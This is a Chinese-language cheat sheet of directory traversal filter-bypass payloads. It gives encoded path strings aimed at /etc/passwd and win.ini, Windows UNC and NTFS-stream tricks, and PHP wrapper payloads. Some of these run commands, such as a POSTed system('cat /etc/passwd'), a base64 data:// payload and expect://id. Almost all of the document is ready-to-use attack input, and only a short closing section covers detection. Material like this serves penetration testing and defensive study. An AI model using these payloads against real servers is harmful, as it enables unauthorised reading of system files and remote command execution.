# 目录穿越绕过技术

## 编码绕过

### URL 编码

```
# 单重编码
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# 双重编码
..%252f..%252f..%252fetc%252fpasswd
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

# 三重编码
..%25252f..%25252f..%25252fetc%25252fpasswd

# 混合编码
..%2f..%2f%2e%2e%2fetc%2fpasswd
```

### Unicode 编码

```
# UTF-8 编码
..%c0%af..%c0%af..%c0%afetc/passwd
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc/passwd

# 过长 UTF-8
..%c0%af
..%e0%80%af
..%c0%ae/

# UTF-16
..%00/.%00/.%00/etc%00/passwd

# IIS Unicode
..%u2215..%u2215..%u2215etc/passwd
%c1%1c
%c1%9c
```

### HTML 实体编码

```
# 十进制
..&#47;..&#47;..&#47;etc&#47;passwd

# 十六进制
..&#x2f;..&#x2f;..&#x2f;etc&#x2f;passwd
```

## 路径分隔符绕过

### 不同分隔符

```
# Windows
..\
..\..\
..\..\..\windows\win.ini

# Unix/Linux
../
../../../../../etc/passwd

# 混合
..\/..\/..\/etc/passwd
..\/..\//..\//etc/passwd
```

### 特殊字符

```
# Null 字节
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd%00.png

# Tab 字符
..\t..\t..\twindows\win.ini

# 换行符
..\n..\n..\nwindows\win.ini

# 回车符
..\r..\r..\rwindows\win.ini
```

## 过滤绕过

### 过滤了 ../

```
# 双写
....//....//....//etc/passwd
..././..././..././etc/passwd

# 使用编码
..%2f..%2f..%2fetc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd

# URL 编码
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd

# 交替使用
..//\..//\..//etc/passwd
```

### 过滤了特定路径

```
# 过滤 etc/passwd
/etc/./passwd
/etc/././passwd
/etc//passwd
/etc/passwd%00
/etc/passwd%00.jpg
/etc/passwd%00.html
/var/etc/passwd    # 其他位置

# 过滤 windows/win.ini
/windows/./win.ini
/windows//win.ini
/windows\win.ini
/c:\windows\win.ini
```

### 过滤了开头的 /

```
# 使用相对路径
var/www/html/../../../etc/passwd
./../../../etc/passwd

# 使用 .. 起始
../../../etc/passwd
```

## Windows 特有绕过

### UNC 路径

```
\\127.0.0.1\c$\windows\win.ini
\\localhost\c$\windows\win.ini
\\?\c:\windows\win.ini
\\.\c:\windows\win.ini
\\127.0.0.1\admin$\system32\cmd.exe
```

### NTFS 流

```
# NTFS 备用数据流
file.txt::$DATA
file.txt::$INDEX_ALLOCATION

# 使用 ADS 读取
..\\..\\..\\windows\\win.ini::$DATA
```

### 短文件名

```
# 8.3 格式
C:\Progra~1\
C:\Docume~1\
C:\WINDOWS\win.ini -> C:\WINDOWS\WIN.INI
C:\Documents and Settings -> C:\DOCUME~1

# 示例
..\\..\\..\\PROGRA~1\\
..\\..\\..\\DOCUME~1\\
```

### 特殊设备名

```
# Windows 设备名
CON
PRN
AUX
NUL
COM1
LPT1

# 示例
..\..\..\windows\con
..\..\..\windows\nul
```

## 协议绕过

### PHP 伪协议

```
# php://filter
php://filter/convert.base64-encode/resource=../../../etc/passwd
php://filter/read=string.rot13/resource=../../../etc/passwd
php://filter/convert.iconv.utf-8.utf-16/resource=../../../etc/passwd

# php://input
php://input
# POST: <?php system('cat /etc/passwd'); ?>

# data://
data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9wYXNzd2QnKTsgPz4=

# phar://
phar:///path/to/archive.phar/file.txt

# zip://
zip:///path/to/archive.zip#file.txt
```

### 其他协议

```
# file://
file:///etc/passwd
file:///c:/windows/win.ini

# expect://
expect://id

# rar://
rar:///path/to/archive.rar#file.txt
```

## 应用层绕过

### 参数污染

```
# 多个同名参数
file=test.txt&file=../../../etc/passwd
path=/var/www&path=/../../../etc/passwd

# 不同处理方式
# PHP: 取最后一个值
# ASP.NET: 所有值用逗号连接
```

### 数组参数

```
file[0]=test.txt&file[1]=../../../etc/passwd
path[]=safe&path[]=../../../etc/passwd
```

### 编码嵌套

```
# 多层编码
%252e%252e%252f -> %2e%2e%2f -> ../

# 不同编码混合
..%2f%c0%ae%c0%ae%c0%afetc/passwd
```

## 后缀绕过

### 文件类型绕过

```
# 添加合法后缀
../../../etc/passwd%00.jpg
../../../etc/passwd%00.png
../../../etc/passwd%00.html
../../../etc/passwd.jpg (服务器忽略后缀)

# 空字节截断
../../../etc/passwd%00
../../../etc/passwd%00.jpg
```

### Content-Type 绕过

```
# 修改 Content-Type
Content-Type: image/jpeg

# 上传文件但后端处理路径穿越
filename="../../../etc/passwd"
```

## 检测方法

### 响应差异

```
1. 测试正常文件
   - 返回文件内容
   - 记录响应特征

2. 测试穿越路径
   - 返回敏感文件内容
   - 响应特征变化

3. 测试不存在文件
   - 返回错误信息
   - 响应特征变化
```

### 时间差异

```
# 可能的延迟情况
1. 路径存在但无权限
2. 路径指向网络位置
3. 路径指向特殊设备
```

### 错误信息

```
# 分析错误信息
1. 路径不存在错误
2. 权限错误
3. 文件类型错误

# 从错误信息推断
1. 绝对路径
2. Web 根目录
3. 过滤规则
```